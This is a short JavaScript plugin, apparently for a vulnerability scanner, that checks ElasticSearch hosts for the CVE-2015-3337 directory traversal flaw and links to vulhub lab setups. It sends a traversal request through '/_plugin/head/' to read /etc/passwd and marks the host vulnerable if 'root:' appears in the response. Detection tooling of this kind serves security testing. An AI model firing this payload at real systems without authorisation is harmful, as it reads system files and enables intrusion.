module.exports={
	tags:"CVE-2015-3337,",
    des:"ElasticSearch Directory traversal vulnerability（CVE-2015-3337）测试环境",
    dependencies:"",
	VulApps:[],
    urls:["https://github.com/vulhub/vulhub/tree/master/elasticsearch/CVE-2015-3337",
    "https://github.com/vulhub/vulhub/tree/master/elasticsearch/WooYun-2015-110216",
    "https://github.com/vulhub/vulhub/tree/master/elasticsearch/CVE-2015-5531"],
	doCheck:function (url,fnCbk,parms)
	{
        url = url.trim().replace(/[\s\r\n]*/gmi,'');
        var _t = this,_s = this.self,hst = _s.parseUrl(url);
        hst.port = hst.port||(-1 < hst.protocol.indexOf("https")?443:80);
        
        var i = url.indexOf('/',11),szPay1 = url.substr(0, -1 == i ? url.length: i) + '/_plugin/head/../../../../../../../../../etc/passwd';
    _s.request(_s.fnOptHeader({method: 'GET',uri: szPay1})
        ,function (error, response, body)
        {
            body = String(body);
            _s.fnShowBody(body);
            if(body && -1 < body.indexOf("root:"))
            {
                var r = {"url":url,"send":szPay1,"result":body,tags:_t.tags};
                r.vul = true;
                fnCbk(r,_t);
            }
        }
    );
	}
};